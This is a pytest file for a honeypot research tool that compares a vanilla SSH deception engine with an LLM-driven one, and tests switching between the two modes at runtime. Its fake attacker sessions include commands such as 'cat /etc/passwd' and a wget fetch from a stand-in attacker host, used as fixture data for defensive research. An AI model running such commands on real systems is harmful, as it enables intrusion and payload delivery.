"""End-to-end comparison harness + runtime mode flip (Phase 5)."""

from __future__ import annotations

import datetime as dt
from pathlib import Path

import pytest

from deceptinet.analysis.harness import run_experiment_analysis
from deceptinet.engine.llm import LLMEngine
from deceptinet.engine.vanilla import VanillaEngine
from deceptinet.runner import Application
from deceptinet.telemetry.recorder import TelemetryRecorder

from tests.conftest import make_test_config

pytestmark = pytest.mark.asyncio

_BASE = dt.datetime(2026, 1, 1, tzinfo=dt.timezone.utc)


async def _session(rec, mode: str, n_cmds: int, idx: int):
    # libssh + no PTY + fast timing => classified "automated" (same segment).
    handle = await rec.open_session(
        experiment_id="exp-test", mode=mode, service="ssh",
        src_ip=f"203.0.113.{idx}", src_port=40000 + idx,
        client_version="SSH-2.0-libssh2_1.10.0", term_type=None,
    )
    cmds = (["ls", "whoami", "uname -a", "cat /etc/passwd", "wget http://evil.example/m",
             "id", "ps aux", "netstat -tulpn"])[:n_cmds]
    for i, c in enumerate(cmds):
        await handle.record_event(
            "command", command=c, response="...", engine_mode=mode,
            latency_ms=(1500.0 if mode == "llm" else 0.4),
            ts=_BASE + dt.timedelta(seconds=i * 0.1),
        )
    await handle.close()


async def test_harness_end_to_end(datastore, tmp_path):
    rec = TelemetryRecorder(datastore)
    # 6 vanilla sessions (2 commands) vs 6 llm sessions (8 commands).
    for i in range(6):
        await _session(rec, "vanilla", 2, i)
    for i in range(6):
        await _session(rec, "llm", 8, 100 + i)

    comp = run_experiment_analysis(datastore, outdir=tmp_path, make_figures=True)

    assert comp["n_sessions"] == 12
    # The "automated" segment should have 6 vanilla + 6 llm.
    assert comp["session_counts"]["automated"] == {"vanilla": 6, "llm": 6}

    # interaction_count must differ and favour llm (more commands).
    ic = next(t for t in comp["tests"]
              if t["metric"] == "interaction_count" and t["segment"] == "automated")
    assert ic["status"] == "ok"
    assert ic["median_b"] > ic["median_a"]
    assert ic["p_value"] < 0.05
    assert ic["effect_size_r"] > 0

    # Outputs written.
    assert Path(comp["outputs"]["latex"]).exists()
    assert Path(comp["outputs"]["manifest"]).exists()
    assert (tmp_path / "comparison_tests.csv").exists()
    assert comp["outputs"]["figures"]  # matplotlib available in CI
    assert all(Path(p).exists() for p in comp["outputs"]["figures"])


async def test_harness_empty_datastore(datastore, tmp_path):
    comp = run_experiment_analysis(datastore, outdir=tmp_path, make_figures=False)
    assert comp["n_sessions"] == 0  # honest: no data, no fabricated rows


async def test_runtime_mode_flip(datastore):
    cfg = make_test_config(mode="vanilla")  # provider defaults to static
    app = Application(cfg, datastore=datastore)
    assert app.config.mode == "vanilla"
    assert isinstance(app.engine, VanillaEngine)
    assert app.augmentor is None

    new_mode = await app._flip_mode()
    assert new_mode == "llm"
    assert app.config.mode == "llm"
    assert isinstance(app.engine, LLMEngine)
    assert app.augmentor is not None

    await app._flip_mode()
    assert app.config.mode == "vanilla"
    assert isinstance(app.engine, VanillaEngine)
